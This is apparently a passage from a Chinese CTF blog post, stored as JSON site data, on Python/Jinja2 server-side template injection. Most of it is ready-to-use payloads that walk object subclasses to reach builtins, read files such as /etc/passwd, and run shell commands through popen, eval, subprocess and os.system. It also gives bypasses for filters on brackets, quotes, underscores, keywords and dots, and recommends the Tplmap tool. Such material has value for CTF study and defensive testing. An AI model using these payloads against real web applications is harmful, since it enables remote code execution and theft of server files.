&quot;&quot;.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] {}.__class__.__mro__[1] request.__class__.__mro__[1] 可以借助```getitem绕过中括号的限制： ''.__class__.__mro__.__getitem__(1) {}.__class__.__bases__.__getitem__(0) ().__class__.__bases__.__getitem__(0) request.__class__.__mro__.__getitem__(1) 寻找方法获取基本类后，继续向下获取基本类object的子类： 1&quot;&quot;.__class__.__bases__[0].__subclasses__() 找到重载过的init类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）： 12345print(&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__)print(&quot;&quot;.__class__.__bases__[0].__subclasses__()[1].__init__)输出：&lt;function BlueprintSetupState.__init__ at 0x038CE0C0&gt;&lt;slot wrapper '__init__' of 'weakref' objects&gt; 查看其引用builtinsPython 程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于 builtins 却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块。 1&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__.__globals__['__builtins__'] 这里会返回 dict 类型，寻找 keys 中可用函数，直接调用即可，使用 keys 中的 open （python2中是file）以实现读取文件的功能： 1&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__.__globals__['__builtins__']['open']('D:\\\\test.txt').read() 读写文件在python2中使用file读写文件： 1234#读文件：&quot;&quot;.__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()#写文件：&quot;&quot;.__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test') 在python3中file没有了，使用open： 12#读文件：&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__.__globals__['__builtins__']['open']('D:\\\\test.txt').read() 命令执行1.popen使用popen进行命令执行。首先要先找到os._wrap_close类，查看 os._wrap_close 方法的位置： 123&gt;&gt;&gt; import os&gt;&gt;&gt; ''.__class__.__mro__[1].__subclasses__().index(os._wrap_close)132 返回了下标索引，直接调用它 1&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls').read() 2.eval使用eval进行命令执行。 1&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()') 3.warnings.catch_warnings利用warnings.catch_warnings 进行命令执行。这个在python2和python3中有些不同，先说Python2的： 1[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami') 然后是Python3的： 1().__class__.__bases__[0].__subclasses__()[139].__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('whoami').read()&quot;) 或者也可以这样多行执行： 1234567891011{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__(&quot;os&quot;).popen(&quot;id&quot;).read()') }} {% endif %} {% endif %} {% endfor %}{% endif %}{% endfor %} 4.subprocess这个模块原本在python2中是commands，在python中被替换为subprocess。 1{}.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__['__builtins__']['__import__']('subprocess').getstatusoutput('ls') 1{}.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__['__builtins__']['__import__']('os').system('ls') 1{}.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read() Bypass现在很多模板注入都有限制，比如限制输入某些关键字，或者干脆直接限制输入某些字符。下面总结了一些绕过的方法。 过滤[]使用getitem()或者pop()绕过，如：&quot;&quot;.__class__.__bases__[0]绕过后：&quot;&quot;.__class__.__bases__.getitem(0) 读文件： 1&quot;&quot;.__class__.__base__.__subclasses__().pop(-1).__init__.__globals__.pop('__builtins__').pop('open')('test.txt').read() 执行命令： 1''.__class__.__base__.__subclasses__().pop(132).__init__.__globals__.pop('popen')('ls').read() 过滤引号request.args 是 flask 中的一个属性，为返回请求的参数，这里把popen和cmd当作变量名，将值传进来，进而绕过了引号的过滤。 1{{().__class__.__base__.__subclasses__().pop(117).__init__.__globals__[request.args.popen](request.args.cmd).read()}}&amp;popen=popen&amp;cmd=whoami 过滤下划线也是动态传参绕过 1{{&quot;&quot;[request.args.class][request.args.base][request.args.subclasses]()[117][request.args.init][request.args.globals][request.args.popen](request.args.cmd).read()}}&amp;class=__class__&amp;base=__base__&amp;subclasses=__subclasses__&amp;init=__init__&amp;globals=__globals__&amp;popen=popen&amp;cmd=cat /flag 过滤关键字比如过滤掉subclasses： 使用request.args动态传参绕过比如过滤掉subclasses： 123&quot;&quot;.__class__.__bases__[0][request.args.a]()[117].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()')}}&amp;a=__subclasses__# cookie传值&quot;&quot;.__class__.__bases__[0][request.cookies['var']]()[117].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()') 使用base64编码绕过1234# 编码前().__class__.__bases__[0].__subclasses__()[169].__init__.__globals__.__builtins__['eval'](&quot;__import__('os').popen('ls').read()&quot;)# 编码后().__class__.__bases__[0].__subclasses__()[169].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')](&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=&quot;.decode('base64')) 使用字符串拼接绕过使用加号来拼接字符串， = 。 1&quot;&quot;.__class__.__base__['__subcl'+'asses__']()[117].__init__.__globals__['popen']('ls').read() 使用join连接字符串， 1[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[117].__init__.__globals__['popen']('ls').read() 过滤点号jinja2模板中有很多有用的内置过滤器，这里使用的是attr和join这两个过滤器。 1```{{request|attr([&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2]|join)}}```就相当于```{{request.__class__}} 使用工具Tplmap 服务器端模板注入和代码注入检测与开发工具 一个 python 工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用 SSTI 来访问目标文件或操作系统。一些受支持的模板引擎包括 PHP、Ruby、JaveScript、Python、ERB、Jinja2 和 Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。 神器","link":"/2020/07/25/ssti-1/"}],"tags":[{"name":"ssti","slug":"ssti","link":"/tags/ssti/"}],"categories":[{"name":"ctf","slug":"ctf","link":"/categories/ctf/"},{"name":"python ssti","slug":"python-ssti","link":"/categories/python-ssti/"}]}